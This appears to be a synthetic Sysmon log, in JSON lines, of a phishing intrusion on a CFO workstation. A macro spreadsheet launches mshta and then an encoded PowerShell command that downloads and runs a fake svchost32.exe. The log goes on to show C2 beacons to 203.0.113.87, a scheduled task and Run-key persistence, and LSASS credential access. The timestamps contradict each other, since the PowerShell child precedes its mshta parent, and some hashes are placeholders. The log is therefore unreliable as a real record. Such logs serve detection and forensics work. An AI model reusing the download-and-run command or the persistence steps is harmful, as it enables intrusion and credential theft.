{"@timestamp":"2024-11-15T16:00:12.441Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":141200,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"OUTLOOK.EXE","pid":2240,"executable":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","command_line":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"","hash":{"md5":"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6","sha256":"legitimate_outlook_hash_placeholder"},"parent":{"name":"explorer.exe","pid":1124}},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01","hostname":"WS-CFO-01.lifetechpharma.local"},"rule":{"name":"process_creation"}}
{"@timestamp":"2024-11-15T16:58:03.120Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":11,"record_id":141388,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"11"},"file":{"path":"C:\\Users\\m.cohen\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\T4K9J2A1\\Q4-Forecast-Update.xlsm","name":"Q4-Forecast-Update.xlsm"},"process":{"name":"OUTLOOK.EXE","pid":2240},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"file_create_attachment_download"}}
{"@timestamp":"2024-11-15T16:58:44.883Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":141402,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"EXCEL.EXE","pid":5512,"executable":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE","command_line":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\m.cohen\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\T4K9J2A1\\Q4-Forecast-Update.xlsm\"","parent":{"name":"OUTLOOK.EXE","pid":2240}},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"process_creation"}}
{"@timestamp":"2024-11-15T16:59:02.015Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":141406,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"mshta.exe","pid":6048,"executable":"C:\\Windows\\System32\\mshta.exe","command_line":"mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAa\"\",0:close\")","hash":{"md5":"0b4d4b851d8de8fcbfec8c3e1c8a2b3d","sha256":"3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3"},"parent":{"name":"EXCEL.EXE","pid":5512}},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"technique_id=T1218.005,technique_name=Mshta"}}
{"@timestamp":"2024-11-15T16:42:33.000Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":141410,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"powershell.exe","pid":3784,"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":"powershell.exe -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwAHMAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC0AYwBkAG4ALgBuAGUAdAAvAHUAcABkAGEAdABlAC4AZQB4AGUAJwAsACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0ADMAMgAuAGUAeABlACcAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwB2AGMAaABvAHMAdAAzADIALgBlAHgAZQAnAA==","hash":{"md5":"04029e121a0cfa5991749937dd22a1d9","sha256":"de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c"},"parent":{"name":"mshta.exe","pid":6048}},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"technique_id=T1059.001,technique_name=PowerShell"}}
{"@timestamp":"2024-11-15T16:42:51.230Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":11,"record_id":141412,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"11"},"file":{"path":"C:\\Windows\\Temp\\svchost32.exe","name":"svchost32.exe"},"process":{"name":"powershell.exe","pid":3784},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"file_create_suspicious_temp"}}
{"@timestamp":"2024-11-15T16:43:04.780Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":141414,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"svchost32.exe","pid":7120,"executable":"C:\\Windows\\Temp\\svchost32.exe","command_line":"C:\\Windows\\Temp\\svchost32.exe -c 203.0.113.87 -p 443","hash":{"md5":"5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f","sha256":"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a"},"parent":{"name":"powershell.exe","pid":3784}},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"technique_id=T1036.005,technique_name=Match_Legitimate_Name_Location"}}
{"@timestamp":"2024-11-15T16:43:08.100Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":3,"record_id":141416,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"3"},"network":{"direction":"egress","transport":"tcp","type":"ipv4"},"destination":{"ip":"203.0.113.87","port":443},"source":{"ip":"10.10.1.55","port":49823},"process":{"name":"svchost32.exe","pid":7120},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"technique_id=T1071.001,technique_name=Web_Protocols"}}
{"@timestamp":"2024-11-15T16:47:22.553Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":13,"record_id":141430,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"13"},"registry":{"path":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}","key":"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}","value":"Actions"},"process":{"name":"schtasks.exe","pid":5908},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"technique_id=T1053.005,technique_name=Scheduled_Task"}}
{"@timestamp":"2024-11-15T16:47:23.010Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":141431,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"schtasks.exe","pid":5908,"executable":"C:\\Windows\\System32\\schtasks.exe","command_line":"schtasks.exe /Create /SC ONLOGON /TN \"Windows Update Helper\" /TR \"C:\\Windows\\Temp\\svchost32.exe -c 203.0.113.87 -p 443\" /RU SYSTEM /F","parent":{"name":"svchost32.exe","pid":7120}},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"technique_id=T1053.005,technique_name=Scheduled_Task"}}
{"@timestamp":"2024-11-15T16:47:35.228Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":13,"record_id":141432,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"13"},"registry":{"path":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsTelemetrySvc","value":"C:\\Windows\\Temp\\svchost32.exe -c 203.0.113.87 -p 443"},"process":{"name":"svchost32.exe","pid":7120},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"technique_id=T1547.001,technique_name=Registry_Run_Keys"}}
{"@timestamp":"2024-11-15T17:02:14.440Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":10,"record_id":141501,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"10"},"process":{"name":"svchost32.exe","pid":7120,"executable":"C:\\Windows\\Temp\\svchost32.exe"},"target":{"process":{"name":"lsass.exe","pid":648,"executable":"C:\\Windows\\System32\\lsass.exe"}},"rule":{"name":"technique_id=T1003.001,technique_name=LSASS_Memory"},"winlog":{"event_data":{"GrantedAccess":"0x1010","CallTrace":"C:\\Windows\\Temp\\svchost32.exe+0x1234|C:\\Windows\\System32\\ntdll.dll+0x7f1a2"}},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"}}
{"@timestamp":"2024-11-15T17:03:55.890Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":3,"record_id":141520,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"3"},"network":{"direction":"egress","transport":"tcp","type":"ipv4"},"destination":{"ip":"203.0.113.87","port":443},"source":{"ip":"10.10.1.55","port":49901},"process":{"name":"svchost32.exe","pid":7120},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"c2_beacon_interval_detected"}}
{"@timestamp":"2024-11-15T17:23:55.112Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":3,"record_id":141601,"computer_name":"WS-CFO-01.lifetechpharma.local"},"event":{"code":"3"},"network":{"direction":"egress","transport":"tcp","type":"ipv4"},"destination":{"ip":"203.0.113.87","port":443},"source":{"ip":"10.10.1.55","port":50011},"process":{"name":"svchost32.exe","pid":7120},"user":{"name":"m.cohen","domain":"LIFETECHPHARMA"},"host":{"name":"WS-CFO-01"},"rule":{"name":"c2_beacon_interval_detected"}}
